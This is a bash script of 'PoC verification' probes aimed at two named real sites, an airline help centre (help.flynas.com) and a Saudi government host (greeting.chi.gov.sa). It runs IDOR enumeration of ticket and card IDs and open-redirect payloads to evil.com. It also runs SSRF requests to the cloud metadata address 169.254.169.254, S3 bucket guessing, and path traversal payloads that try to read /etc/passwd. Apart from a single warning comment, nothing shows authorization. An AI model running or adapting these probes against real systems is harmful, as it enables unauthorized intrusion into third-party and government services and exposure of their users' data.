#!/usr/bin/env bash
# ============================================================
# PHASE 10 — Vulnerability PoC Verification Scripts
# Covers: IDOR, SSRF, Open Redirect, S3, Path Traversal
# ============================================================
# WARNING: Only run against authorized targets. Rate-limited.
set -euo pipefail

TARGET1="https://help.flynas.com"
TARGET2="https://greeting.chi.gov.sa"
OUT="./results"

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'
banner() { echo -e "\n${CYAN}[*] $1${NC}"; }
ok()     { echo -e "${GREEN}[+] $1${NC}"; }
warn()   { echo -e "${YELLOW}[!] $1${NC}"; }
high()   { echo -e "${RED}[!!] $1${NC}"; }

# ── IDOR Testing ──────────────────────────────────────────────
test_idor() {
    local base_url="$1" endpoint="$2" id_start="$3" out="$4"
    banner "IDOR Test: $endpoint (IDs $id_start to $((id_start+4)))"
    prev_size=-1
    for id in $(seq "$id_start" "$((id_start+4))"); do
        url="${base_url}${endpoint}${id}"
        result=$(curl -sk -A "$UA" --max-time 15 -w "\n%{http_code} %{size_download}" "$url" 2>/dev/null)
        code=$(echo "$result" | tail -1 | cut -d' ' -f1)
        size=$(echo "$result" | tail -1 | cut -d' ' -f2)
        echo "  [$code] $url ($size bytes)" | tee -a "$out"
        if [ "$code" = "200" ] && [ "$prev_size" -ge 0 ] && [ "$size" != "$prev_size" ]; then
            high "  IDOR likely — different response sizes for different IDs!" | tee -a "$out"
            high "  PoC: curl -sk '$url'" | tee -a "$out"
        fi
        prev_size="$size"
        sleep 0.5  # Rate limit
    done
}

# ── Open Redirect Testing ─────────────────────────────────────
test_redirect() {
    local base="$1" out="$2"
    banner "Open Redirect Test: $base"
    redirect_params=(url redirect next return goto redir return_url redirect_url target)
    payloads=("https://evil.com" "//evil.com" "/\\evil.com" "https://evil.com%23.${base##*/}")

    for param in "${redirect_params[@]}"; do
        for payload in "${payloads[@]}"; do
            test_url="${base}?${param}=${payload}"
            response=$(curl -sk -I -A "$UA" --max-time 10 "$test_url" 2>/dev/null)
            status=$(echo "$response" | grep "^HTTP" | head -1)
            location=$(echo "$response" | grep -i "^Location:" | head -1 | tr -d '\r')
            if echo "$location" | grep -qi "evil\.com"; then
                high "  OPEN REDIRECT: $param=$payload" | tee -a "$out"
                high "    $status → $location" | tee -a "$out"
                high "    PoC: curl -sk -I '${test_url}'" | tee -a "$out"
            fi
        done
    done
}

# ── SSRF Testing ──────────────────────────────────────────────
test_ssrf_params() {
    local base="$1" out="$2"
    banner "SSRF Parameter Test: $base"
    ssrf_params=(url fetch src feed link endpoint webhook image_url img_url proxy)
    ssrf_targets=("http://169.254.169.254/latest/meta-data/" "http://localhost/" "http://127.0.0.1/")

    for param in "${ssrf_params[@]}"; do
        for ssrf_url in "${ssrf_targets[@]}"; do
            test_url="${base}?${param}=${ssrf_url}"
            result=$(curl -sk -A "$UA" --max-time 10 -w "\n%{http_code} %{size_download}" "$test_url" 2>/dev/null)
            code=$(echo "$result" | tail -1 | cut -d' ' -f1)
            size=$(echo "$result" | tail -1 | cut -d' ' -f2)
            if [ "$code" = "200" ] && [ "$size" -gt 0 ]; then
                high "  SSRF POSSIBLE: $param=$ssrf_url → HTTP $code ($size bytes)" | tee -a "$out"
                high "    PoC: curl -sk '$test_url'" | tee -a "$out"
            fi
        done
    done
}

# ── S3 Bucket Enumeration ─────────────────────────────────────
test_s3_buckets() {
    local apex="$1" out="$2"
    banner "S3 Bucket Enumeration for $apex"
    name_variants=(
        "${apex//./-}"
        "${apex%.*}"
        "${apex//./-}-static"
        "${apex//./-}-assets"
        "${apex//./-}-media"
        "${apex//./-}-uploads"
        "${apex//./-}-backup"
        "${apex//./-}-prod"
        "${apex//./-}-dev"
    )

    for bucket in "${name_variants[@]}"; do
        for url in "https://${bucket}.s3.amazonaws.com/" "https://s3.amazonaws.com/${bucket}/"; do
            code=$(curl -sk -o /dev/null -w "%{http_code}" -A "$UA" --max-time 10 "$url" 2>/dev/null)
            case "$code" in
                200)
                    # Check if listable
                    body=$(curl -sk -A "$UA" --max-time 10 "$url" 2>/dev/null)
                    if echo "$body" | grep -q "ListBucketResult"; then
                        high "  S3 LISTABLE: $url" | tee -a "$out"
                    else
                        warn "  S3 EXISTS (not listable): $url ($code)" | tee -a "$out"
                    fi
                    ;;
                403)
                    warn "  S3 EXISTS (403): $bucket — try write check" | tee -a "$out"
                    ;;
                404)
                    ok "  S3 not found: $bucket" ;;
            esac
        done
    done
}

# ── Path Traversal ────────────────────────────────────────────
test_path_traversal() {
    local base="$1" out="$2"
    banner "Path Traversal / LFI Test: $base"
    payloads=(
        "../../../../etc/passwd"
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        "....//....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    )
    params=(file path page view template include doc document)

    for param in "${params[@]}"; do
        for payload in "${payloads[@]}"; do
            url="${base}?${param}=${payload}"
            body=$(curl -sk -A "$UA" --max-time 10 "$url" 2>/dev/null)
            if echo "$body" | grep -q "root:x:0:0"; then
                high "  PATH TRAVERSAL: $param=$payload" | tee -a "$out"
                high "    /etc/passwd contents found!" | tee -a "$out"
                high "    PoC: curl -sk '$url'" | tee -a "$out"
            fi
        done
    done
}

# ── Greeting Card IDOR (chi.gov.sa specific) ─────────────────
banner "10.1 Greeting Card IDOR (chi.gov.sa)"
out="$OUT/chi_gov/vuln_poc.txt"
echo "PoC Verification Results" > "$out"
echo "Target: $TARGET2" >> "$out"
echo "Date: $(date)" >> "$out"
echo "" >> "$out"

# Test known greeting card patterns
banner "Greeting Card ID Enumeration"
for id in 1000 1001 1002 1003 1004; do
    for endpoint in "/api/greeting/" "/api/card/" "/greeting/" "/api/greetings/"; do
        url="${TARGET2}${endpoint}${id}"
        code=$(curl -sk -o /dev/null -w "%{http_code}" -A "$UA" --max-time 10 "$url" 2>/dev/null)
        echo "  [$code] $url" | tee -a "$out"
        sleep 0.3
    done
done

# ── Zendesk Ticket IDOR (help.flynas.com specific) ────────────
banner "10.2 Zendesk Ticket IDOR (help.flynas.com)"
out="$OUT/flynas/vuln_poc.txt"
echo "PoC Verification Results" > "$out"
echo "Target: $TARGET1" >> "$out"
echo "Date: $(date)" >> "$out"
echo "" >> "$out"

test_idor "$TARGET1" "/hc/requests/" "1000" "$out"
test_idor "$TARGET1" "/api/v2/tickets/" "1" "$out"

# ── Redirect & SSRF ───────────────────────────────────────────
banner "10.3 Open Redirect Tests"
test_redirect "$TARGET1" "$OUT/flynas/vuln_poc.txt"
test_redirect "$TARGET2" "$OUT/chi_gov/vuln_poc.txt"

banner "10.4 SSRF Tests"
test_ssrf_params "$TARGET1" "$OUT/flynas/vuln_poc.txt"
test_ssrf_params "$TARGET2" "$OUT/chi_gov/vuln_poc.txt"

banner "10.5 S3 Bucket Enumeration"
test_s3_buckets "flynas.com" "$OUT/flynas/vuln_poc.txt"
test_s3_buckets "chi.gov.sa" "$OUT/chi_gov/vuln_poc.txt"

ok "Phase 10 complete — review $OUT/*/vuln_poc.txt"
